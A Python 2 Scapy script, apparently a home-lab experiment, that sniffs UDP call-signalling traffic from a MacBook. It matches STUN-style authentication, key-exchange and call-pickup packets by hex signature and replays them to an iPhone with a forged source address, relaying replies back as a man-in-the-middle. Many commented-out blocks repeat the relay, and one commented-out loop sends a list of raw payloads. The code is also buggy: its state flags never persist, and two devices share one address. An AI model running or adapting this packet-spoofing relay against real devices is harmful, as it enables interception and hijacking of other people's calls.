import sys
from scapy.all import *


iphone = "192.168.0.104"
kali = "192.168.0.104"
macbook = "192.168.0.105"
work = "192.168.0.102"
pris = "192.168.0.104"
source = kali
destiny = iphone


dport = 0
sport = 61234






def processPackage(s):
	auth = True
	keyExchange = True
	pickup = True

	if auth and "0f000100082112a442".decode('hex') in s.load:
		print "AUTHHHHHHHHH"
		sport = s.sport
		dport = s.dport
		response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s.load)
		response.show()
		send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)
		auth = False
	elif keyExchange and "0f000100382112a442".decode('hex') in s.load:
		print "KEY EXCHANGEEEEEEE"
		sport = s.sport
		dport = s.dport
		response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s.load)
		response.show()
		send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)
		keyExchange = False
	elif pickup and "2004000400".decode('hex') in s.load:
		print "DESCOLGARRRRRRRRRRRRRR"
		sport = s.sport
		dport = s.dport
		send(IP(src=macbook, dst=iphone)/UDP(sport=sport, dport=dport)/s.load)
		pickUp = False
	else:
		print "OTROOO: "
		print s.load.encode('hex')
		sport = s.sport
		dport = s.dport
		if s.haslayer(Raw):
			send(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s.load)
		





myfilter = "udp and src %s" % (macbook)
sniff(filter=myfilter, prn=processPackage)


# #Auth
# print "waiting for Auth..."
# myfilter = "udp and src %s and dst %s and data contains 0f000100082112a442" % (macbook, iphone)
# s = sniff(filter=myfilter, count=1)
# sport = s[0].sport
# dport = s[0].dport
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# # #Key exchange
# print "waiting for key exchange..."
# myfilter = "udp and src %s and dst %s and data contains 0f000100382112a442" % (macbook, iphone)
# s = sniff(filter=myfilter, count=1)
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)


# # Descolgar
# print "waiting to pickup..."
# myfilter = "udp and src %s and dst %s and data contains" % (macbook, kali)
# #while s[0].load == None:
# s = sniff(filter=myfilter, count=1)
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)


# # Descolgar 2
# print "waiting for pickup 2..."
# s = sniff(filter=myfilter, count=1)
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# print "waiting..."
# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# print "waiting..."
# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=source, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)

# # Descolgar
# response = sr1(IP(src=kali, dst=iphone)/UDP(sport=sport, dport=dport)/s[0].load)
# response.show()
# send(IP(src=kali, dst=macbook)/UDP(sport=response.sport, dport=response.dport)/response.load)

# s = sniff(filter=myfilter, count=1)









# for i in range(0, len(payloads)):
# 	print "\n\n\n--------------------PAYLOAD%d--------------------\n\n" % i
# 	p = sr1(IP(src=macbook, dst=iphone)/UDP(sport=sport, dport=dport)/payloads[i].decode('hex'))
	

# 	if p:
# 		p.show()


